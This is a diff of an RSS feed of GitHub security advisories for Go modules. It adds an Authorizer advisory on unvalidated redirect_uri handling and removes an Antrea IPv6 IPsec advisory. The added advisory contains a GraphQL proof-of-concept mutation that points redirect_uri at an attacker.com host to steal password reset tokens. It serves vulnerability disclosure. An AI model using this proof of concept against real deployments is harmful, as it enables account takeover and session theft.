@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-04-06T17:58:31.832Z</updated>
+    <updated>2026-04-06T19:06:09.099Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,89 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/authorizerdev/authorizer] Authorizer: Password reset token theft and full auth token redirect via unvalidated redirect_uri]]></title>
+        <id>https://github.com/advisories/GHSA-x3f4-v83f-7wp2</id>
+        <link href="https://github.com/advisories/GHSA-x3f4-v83f-7wp2"/>
+        <updated>2026-04-06T17:59:30.000Z</updated>
+        <content type="html"><![CDATA[<p>Hi,</p>
+<p>I found that 6 endpoints in Authorizer accept a user-controlled <code>redirect_uri</code> and append sensitive tokens to it without validating the URL against <code>AllowedOrigins</code>. The OAuth <code>/app</code> handler validates redirect_uri at <code>http_handlers/app.go:46</code>, but the GraphQL mutations and verify_email handler skip validation entirely. An attacker can steal password reset tokens, magic link tokens, and full auth sessions (access_token + id_token + refresh_token) by pointing redirect_uri to their server. Verified against HEAD (commit 73679fa).</p>
+<h2 id="affected-endpoints">Affected Endpoints</h2>
+<ol>
+<li><strong>ForgotPassword</strong> (<code>internal/graphql/forgot_password.go:76-77</code>) - password reset tokens</li>
+<li><strong>MagicLinkLogin</strong> (<code>internal/graphql/magic_link_login.go:150-151</code>) - magic link auth tokens</li>
+<li><strong>Signup</strong> (<code>internal/graphql/signup.go:211-212</code>) - email verification tokens</li>
+<li><strong>InviteMembers</strong> (<code>internal/graphql/invite_members.go:90-91</code>) - invitation tokens</li>
+<li><strong>OAuthLoginHandler</strong> (<code>internal/http_handlers/oauth_login.go:18-20</code>) - OAuth redirect stored in state</li>
+<li><strong>VerifyEmailHandler</strong> (<code>internal/http_handlers/verify_email.go:27,178</code>) - full auth tokens (access + id + refresh)</li>
+</ol>
+<h2 id="root-cause">Root Cause</h2>
+<p>Because these 6 endpoints completely lack the <code>validators.IsValidOrigin()</code> check, this vulnerability bypasses secure configurations. Even if a production administrator strictly configures <code>AllowedOrigins</code> to <code>["https://my-secure-app.com"]</code>, an attacker can still steal tokens by passing <code>https://attacker.com</code> to these specific GraphQL mutations. The validation only exists in the <code>/app</code> OAuth handler, not in any of the GraphQL mutations.</p>
+<p>In <code>forgot_password.go:76-77</code>, the user-supplied <code>redirect_uri</code> is accepted without validation:</p>
+<pre><code>if strings.TrimSpace(refs.StringValue(params.RedirectURI)) != "" {
+    redirectURI = refs.StringValue(params.RedirectURI)
+}
+</code></pre>
+<p>The reset token is appended to this URL at <code>internal/utils/common.go:77</code>:</p>
+<pre><code>func GetForgotPasswordURL(token, redirectURI string) string {
+    verificationURL := redirectURI + "?token=" + token
+    return verificationURL
+}
+</code></pre>
+<p>Compare with the OAuth flow at <code>internal/http_handlers/app.go:46</code> which validates correctly:</p>
+<pre><code>if !validators.IsValidOrigin(redirectURI, h.Config.AllowedOrigins) {
+    c.JSON(400, gin.H{"error": "invalid redirect url"})
+    return
+}
+</code></pre>
+<p>This validation is missing from all 6 endpoints listed above.</p>
+<h2 id="most-severe-path-full-token-theft-via-verify_email">Most Severe Path: Full Token Theft via verify_email</h2>
+<p>After a user clicks the verification link, <code>verify_email.go:178</code> generates full auth tokens and redirects to the (unvalidated) URL:</p>
+<pre><code>params := "access_token=" + authToken.AccessToken.Token +
+    "&amp;token_type=bearer&amp;expires_in=" + ... +
+    "&amp;id_token=" + authToken.IDToken.Token + "&amp;nonce=" + nonce
+</code></pre>
+<p>The redirect_uri is stored in the JWT claim from the original request (attacker-controlled). The attacker receives the victim's access_token, id_token, and refresh_token directly.</p>
+<p>Because tokens are appended as URL query parameters, they are also automatically leaked to the attacker's server access logs, the victim's browser history, and any third-party analytics scripts on the attacker's page via the <code>Referer</code> header.</p>
+<h2 id="poc">PoC</h2>
+<pre><code>mutation {
+  forgot_password(params: {
+    email: "victim@example.com"
+    redirect_uri: "https://attacker.com/steal"
+  }) {
+    message
+  }
+}
+</code></pre>
+<p>The victim receives a legitimate password reset email with the link <code>https://attacker.com/steal?token=&lt;reset_token&gt;</code>. Clicking the link sends the reset token to the attacker.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>Account takeover via stolen password reset tokens</li>
+<li>Full session theft via stolen access_token + id_token + refresh_token</li>
+<li>Passwordless account compromise via stolen magic link tokens</li>
+<li>No authentication required to trigger (the GraphQL mutations are public)</li>
+<li>Victim only needs to click the email link from their trusted Authorizer instance</li>
+</ul>
+<h2 id="additional-note">Additional Note</h2>
+<p>The default <code>AllowedOrigins</code> at <code>cmd/root.go:39</code> is <code>["*"]</code>, so even the OAuth endpoint's validation is a no-op by default. Recommend changing the default to require explicit configuration.</p>
+<p>Koda Reef</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/authorizerdev/authorizer/security/advisories/GHSA-x3f4-v83f-7wp2">https://github.com/authorizerdev/authorizer/security/advisories/GHSA-x3f4-v83f-7wp2</a></li>
+<li><a href="https://github.com/authorizerdev/authorizer/pull/502">https://github.com/authorizerdev/authorizer/pull/502</a></li>
+<li><a href="https://github.com/authorizerdev/authorizer/commit/6d9bef1aaba3f867f8c769b93eb7fc80e4e7b0a2">https://github.com/authorizerdev/authorizer/commit/6d9bef1aaba3f867f8c769b93eb7fc80e4e7b0a2</a></li>
+<li><a href="https://github.com/authorizerdev/authorizer/releases/tag/2.0.1">https://github.com/authorizerdev/authorizer/releases/tag/2.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-x3f4-v83f-7wp2">https://github.com/advisories/GHSA-x3f4-v83f-7wp2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-x3f4-v83f-7wp2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-06T17:59:27.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/authorizerdev/authorizer] Authorizer: CQL/N1QL Injection in Cassandra and Couchbase Backends via fmt.Sprintf String Interpolation]]></title>
         <id>https://github.com/advisories/GHSA-jfwg-rxf3-p7r9</id>
@@ -1080,48 +1163,5 @@ echo "[*] File should now exist at ${TARGET} on the target."
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-04-03T04:07:55.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[antrea.io/antrea] Antrea has Missing Encryption of Sensitive Data]]></title>
-        <id>https://github.com/advisories/GHSA-qcmw-8mm4-4p28</id>
-        <link href="https://github.com/advisories/GHSA-qcmw-8mm4-4p28"/>
-        <updated>2026-04-03T04:02:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>This is a missing encryption vulnerability (CWE-311) affecting inter-Node Pod traffic. In Antrea clusters configured for dual-stack networking with IPsec encryption enabled (<code>trafficEncryptionMode: ipsec</code>), Antrea fails to apply encryption for IPv6 Pod traffic.</p>
-<p>While the IPv4 traffic is correctly encrypted via ESP (Encapsulating Security Payload), traffic using IPv6 is transmitted in plaintext. This occurs because the packets are encapsulated (using Geneve or VXLAN) but bypass the IPsec encryption layer.</p>
-<p>Impacted Users: users with dual-stack clusters and IPsec encryption enabled.</p>
-<p>Single-stack IPv4 or IPv6 clusters are not affected.</p>
-<h3 id="patches">Patches</h3>
-<p>Yes, the issue has been patched: <a href="https://github.com/antrea-io/antrea/pull/7759">https://github.com/antrea-io/antrea/pull/7759</a>
-Users should upgrade to one of the following versions:</p>
-<ul>
-<li>Antrea v2.6.0 or later</li>
-<li>Antrea v2.5.2</li>
-<li>Antrea v2.4.5</li>
-</ul>
-<p>Antrea recommends running the <code>antctl check installation --run ipsec</code> tool after upgrading to verify that both address families are correctly producing ESP traffic.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>There is no configuration workaround to enable IPsec IPv6 in affected versions. If an immediate upgrade is not possible, user may consider using WireGuard instead for inter-Node Pod traffic encryption. The WireGuard support in Antrea does <em>not</em> suffer from the same issue.</p>
-<h3 id="resources">Resources</h3>
-<p>Pull Request with Fix: <a href="https://github.com/antrea-io/antrea/pull/7759">antrea-io/antrea#7759</a>
-Validation Tool PR: <a href="https://github.com/antrea-io/antrea/pull/7757">antrea-io/antrea#7757</a>
-Antrea Documentation: <a href="https://github.com/antrea-io/antrea/blob/main/docs/traffic-encryption.md">Traffic Encryption Guide</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/antrea-io/antrea/security/advisories/GHSA-qcmw-8mm4-4p28">https://github.com/antrea-io/antrea/security/advisories/GHSA-qcmw-8mm4-4p28</a></li>
-<li><a href="https://github.com/antrea-io/antrea/pull/7757">https://github.com/antrea-io/antrea/pull/7757</a></li>
-<li><a href="https://github.com/antrea-io/antrea/pull/7759">https://github.com/antrea-io/antrea/pull/7759</a></li>
-<li><a href="https://github.com/antrea-io/antrea/commit/738bad662b20a5d358d19466936176ef580a9b07">https://github.com/antrea-io/antrea/commit/738bad662b20a5d358d19466936176ef580a9b07</a></li>
-<li><a href="https://github.com/antrea-io/antrea/blob/main/docs/traffic-encryption.md">https://github.com/antrea-io/antrea/blob/main/docs/traffic-encryption.md</a></li>
-<li><a href="https://github.com/advisories/GHSA-qcmw-8mm4-4p28">https://github.com/advisories/GHSA-qcmw-8mm4-4p28</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qcmw-8mm4-4p28</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-03T04:02:47.000Z</published>
     </entry>
 </feed>
